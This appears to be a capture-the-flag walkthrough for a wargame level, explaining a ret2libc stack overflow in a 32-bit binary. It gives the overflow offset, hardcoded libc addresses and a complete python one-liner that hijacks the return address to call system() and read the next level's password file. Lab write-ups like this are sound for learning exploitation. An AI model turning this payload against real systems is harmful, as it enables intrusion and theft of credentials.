# Level 01 Walkthrough - ret2libc Buffer Overflow

## 1.1 SSH into VM
sshpass -p `cat level00/flag` ssh -o StrictHostKeyChecking=no level01@localhost -p 4242

## Vulnerability

`fgets(password, 100, stdin)` reads 100 bytes into a buffer whose distance to the
saved return address on the stack is only **80 bytes**, causing a controllable overflow.

Additionally, both conditional branches in `main()` always lead to the "incorrect
password" error — there is no reachable success path through normal inputs.

## Stack Layout (main)

```
esp+0x1c  password buffer   (fgets reads 100 bytes here)
...
esp+0x5c  password_result   (overwritten but irrelevant)
...
ebp+0x04  saved return addr  <- overwritten at offset 80 from buffer start
```

Finding the offset with a de Bruijn pattern:
```
EIP = 0x61616175  ->  'uaaa'  ->  position 80 in pattern
```

## Exploit: ret2libc

No ASLR on the target. Addresses from gdb:
```
system()  = 0xf7e6aed0
exit()    = 0xf7e5eb70
"/bin/sh" = 0xf7f897ec  (in libc)
```

Payload (sent as the password):
```
"A" * 80  +  system  +  exit  +  "/bin/sh"
```

## Note on system("/bin/sh") via pipe

When the exploit is delivered through a shell pipe (`echo ... | ./level01`), the
C stdio library has already consumed all pipe data before the shell spawns, so the
child `/bin/sh` sees EOF immediately and exits.  The one-liner below avoids this
by calling `system()` with a command already embedded in the username buffer
instead of spawning an interactive shell.

When using an interactive PTY (e.g. pwntools SSH session as in exploit.py),
`system("/bin/sh")` works directly because stdin is not pre-buffered.

## Solution: embed the command in the username buffer (for pipe delivery)

`a_user_name` (global, `0x804a040`) holds the username. `strncmp` only checks 7
bytes, so the rest of the 256-byte `fgets` input is stored but ignored.

Write `"dat_wil\x00cat /home/users/level02/.pass"` as the username, then call
`system(a_user_name + 8)` — no interactive shell needed, no stdin buffering issue.

## One-liner
python -c "import struct,os; system=0xf7e6aed0; exit_=0xf7e5eb70; cmd_addr=0x804a040+8; os.write(1,'dat_wil\x00cat /home/users/level02/.pass\n'+'A'*80+struct.pack('<I',system)+struct.pack('<I',exit_)+struct.pack('<I',cmd_addr)+'\n')" | ./level01
